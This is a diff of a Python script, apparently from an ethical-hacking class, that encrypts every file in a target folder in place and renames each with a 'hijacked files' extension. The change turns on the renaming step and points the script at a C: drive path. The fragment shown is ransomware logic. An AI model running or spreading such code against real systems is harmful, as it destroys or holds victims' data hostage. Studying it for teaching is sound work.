@@ -11,7 +11,7 @@ import os
 #######################################################
 
 # Extension de los Archivos Secuestrados
-extension = 'IUEHackeoEtico202302'
+extension = 'cifrado'
 
 # Generacion de la llave de cifrado
 def generar_key():
@@ -37,10 +37,10 @@ def cifrar(items, key):
         with open(item, 'wb') as file: 
             file.write(encrypted_data)
 
-        #os.rename(item, item + '.' + extension)
+        os.rename(item, item + '.' + extension)
 
 if __name__ == '__main__':
-    path_to_encrypt = 'f:/CifradoDecifradoDatos/'
+    path_to_encrypt = 'C:/CifradoDecifradoDatos/'
     items = os.listdir(path_to_encrypt)
     full_path = [path_to_encrypt + '\\' + item for item in items]
     
